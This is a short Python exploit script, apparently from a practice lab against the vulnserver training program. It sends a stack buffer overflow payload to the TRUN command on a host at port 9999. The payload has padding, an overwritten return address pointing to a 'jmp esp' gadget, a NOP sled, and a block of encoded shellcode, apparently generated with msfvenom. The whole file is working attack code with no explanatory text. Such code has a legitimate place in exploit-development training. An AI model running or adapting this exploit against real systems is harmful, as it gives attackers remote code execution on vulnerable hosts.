#!/usr/bin/python

import socket
import struct

all_characters = b"".join([ struct.pack('<B' ,x) for x in range(1,256) ])

s = socket.socket()
s.connect( ("10.10.150.15",9999) )

total_length = 2988
offset = 2003
new_eip = struct.pack("<I", 0x62501203)  # jmp esp

nop_sled = b"\x90" * 16

buf =  b""
buf += b"\xdd\xc5\xd9\x74\x24\xf4\xba\x5c\x89\x55\x10\x5e\x29"
buf += b"\xc9\xb1\x52\x83\xee\xfc\x31\x56\x13\x03\x0a\x9a\xb7"
buf += b"\xe5\x4e\x74\xb5\x06\xae\x85\xda\x8f\x4b\xb4\xda\xf4"
buf += b"\x18\xe7\xea\x7f\x4c\x04\x80\xd2\x64\x9f\xe4\xfa\x8b"
buf += b"\x28\x42\xdd\xa2\xa9\xff\x1d\xa5\x29\x02\x72\x05\x13"
buf += b"\xcd\x87\x44\x54\x30\x65\x14\x0d\x3e\xd8\x88\x3a\x0a"
buf += b"\xe1\x23\x70\x9a\x61\xd0\xc1\x9d\x40\x47\x59\xc4\x42"
buf += b"\x66\x8e\x7c\xcb\x70\xd3\xb9\x85\x0b\x27\x35\x14\xdd"
buf += b"\x79\xb6\xbb\x20\xb6\x45\xc5\x65\x71\xb6\xb0\x9f\x81"
buf += b"\x4b\xc3\x64\xfb\x97\x46\x7e\x5b\x53\xf0\x5a\x5d\xb0"
buf += b"\x67\x29\x51\x7d\xe3\x75\x76\x80\x20\x0e\x82\x09\xc7"
buf += b"\xc0\x02\x49\xec\xc4\x4f\x09\x8d\x5d\x2a\xfc\xb2\xbd"
buf += b"\x95\xa1\x16\xb6\x38\xb5\x2a\x95\x54\x7a\x07\x25\xa5"
buf += b"\x14\x10\x56\x97\xbb\x8a\xf0\x9b\x34\x15\x07\xdb\x6e"
buf += b"\xe1\x97\x22\x91\x12\xbe\xe0\xc5\x42\xa8\xc1\x65\x09"
buf += b"\x28\xed\xb3\x9e\x78\x41\x6c\x5f\x28\x21\xdc\x37\x22"
buf += b"\xae\x03\x27\x4d\x64\x2c\xc2\xb4\xef\x59\x1a\x6a\x1d"
buf += b"\x35\x1e\x92\xf3\x9a\x97\x74\x99\x32\xfe\x2f\x36\xaa"
buf += b"\x5b\xbb\xa7\x33\x76\xc6\xe8\xb8\x75\x37\xa6\x48\xf3"
buf += b"\x2b\x5f\xb9\x4e\x11\xf6\xc6\x64\x3d\x94\x55\xe3\xbd"
buf += b"\xd3\x45\xbc\xea\xb4\xb8\xb5\x7e\x29\xe2\x6f\x9c\xb0"
buf += b"\x72\x57\x24\x6f\x47\x56\xa5\xe2\xf3\x7c\xb5\x3a\xfb"
buf += b"\x38\xe1\x92\xaa\x96\x5f\x55\x05\x59\x09\x0f\xfa\x33"
buf += b"\xdd\xd6\x30\x84\x9b\xd6\x1c\x72\x43\x66\xc9\xc3\x7c"
buf += b"\x47\x9d\xc3\x05\xb5\x3d\x2b\xdc\x7d\x5d\xce\xf4\x8b"
buf += b"\xf6\x57\x9d\x31\x9b\x67\x48\x75\xa2\xeb\x78\x06\x51"
buf += b"\xf3\x09\x03\x1d\xb3\xe2\x79\x0e\x56\x04\x2d\x2f\x73"

shellcode= buf

payload =[
b"TRUN /.:/",
b"A"* offset,
new_eip,
nop_sled,
shellcode,
b"C"*( total_length - offset - len(new_eip) - len(nop_sled) - len (shellcode) )

]

payload = b"".join(payload)

s.send(payload)

s.close()
